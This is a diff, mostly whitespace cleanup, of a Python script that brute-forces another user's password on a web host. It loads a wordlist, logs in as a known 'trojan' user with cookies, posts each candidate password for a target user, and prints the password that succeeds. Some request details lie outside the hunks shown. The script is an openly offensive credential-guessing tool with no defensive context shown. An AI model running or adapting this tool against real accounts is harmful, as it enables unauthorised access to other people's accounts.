@@ -2,17 +2,11 @@ import requests
 import re
 from sys import argv
 
-
-
 def main(args):
 
-   
     PASSWORDS = open(args["password_file"],'r').readlines()
-
     TROJAN_USER = (args["known_user"],args["known_passwd"])
-
     TARGET_USER = args["target_user"]
-    
     HOST = args["host"]
 
     cookies = {
@@ -22,7 +16,6 @@ def main(args):
 
     for password in PASSWORDS:
         if password:
-            
             print(f"Testing: {password}")
             
             requests.post(HOST,{
@@ -44,8 +37,6 @@ def main(args):
                print(f"Password for {TARGET_USER} is {password}")
                exit()
 
-
-
 if __name__ == "__main__":
 
     if len(argv) < 10:
@@ -55,21 +46,20 @@ if __name__ == "__main__":
         exit()
     
     args = {}
-
     for i, argument in enumerate(argv):
         
         if argument == "-h" or argument == "--host" :
             args["host"] = argv[i + 1]
-        
+            
         elif argument == "-u" or argument == "--user":
-            args["known_user"] = argv[i + 1]
+            args["known_user"] = argv[i + 1]   
             
         elif argument == "-p" or argument == "--password":
-            args["known_passwd"] = argv[i + 1]
-         
+            args["known_passwd"] = argv[i + 1] 
+            
         elif argument == "-t" or argument == "--target-user":
             args["target_user"] = argv[i + 1]
-        
+            
         elif argument == "-f" or argument == "--password-file":
             args["password_file"] = argv[i + 1]
             
